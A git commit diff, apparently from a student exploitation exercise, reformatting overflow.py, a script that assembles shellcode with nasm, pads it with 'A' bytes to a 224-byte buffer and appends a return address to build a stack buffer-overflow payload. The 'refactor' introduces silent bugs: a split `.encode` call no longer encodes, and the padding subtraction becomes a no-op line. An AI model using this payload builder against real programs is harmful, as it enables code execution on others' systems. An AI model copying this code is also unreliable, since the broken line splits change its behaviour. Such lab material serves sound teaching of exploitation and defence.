8efd0bdbb7f66f8be3341fe92a4b4eda349bd790
Haisch-Nico <nico.haisch@studmail.htw-aalen.de>
2022-06-07 17:11:39 +0200

    refactor: changed overflow.py

--- overflow.py
+++ overflow.py
@@ -13,8 +13,10 @@ if len(sys.argv)==3:
 
     if(os.path.isfile(sys.argv[2])):
         path=sys.argv[2]
-        subprocess.run(" nasm -f bin {} -o a.bin".format(path),shell=True)
-        subprocess.run("./dumpshellcode.py a.bin > a.txt" ,shell=True)
+        subprocess.run(" nasm -f bin {} -o a.bin".format(path),
+        shell=True)
+        subprocess.run("./dumpshellcode.py a.bin > a.txt" ,
+        shell=True)
     else:
         print("Datei existiert nicht!")
         sys.exit(0)
@@ -22,14 +24,17 @@ if len(sys.argv)==3:
     f=open("a.txt","r+")
     shellcode= f.read()
     shellcode=bytes(shellcode, 'utf-8')
-    shellcode=shellcode.decode('unicode_escape').encode("raw_unicode_escape")
+    shellcode=shellcode.decode('unicode_escape').encode
+    ("raw_unicode_escape")
     f.close()
 
     os.system("rm a.txt")
     os.system("rm a.bin")
 
-    padding_size= 224 - (len(shellcode))- 8
+    padding_size= 224 - (len(shellcode))
+    -(int((len(sys.argv[1])/2))+2)
     os.write(1,shellcode + b"A" * padding_size + address)
 else:
-    print("Wie folgt zu Benutzen:", "Programmname:" ,sys.argv[0] , "Bufferadresse", "Assemblerprogramm")
+    print("Wie folgt zu Benutzen:", "Programmname:" ,sys.argv[0] , 
+    "Bufferadresse", "Assemblerprogramm")
     sys.exit(0)
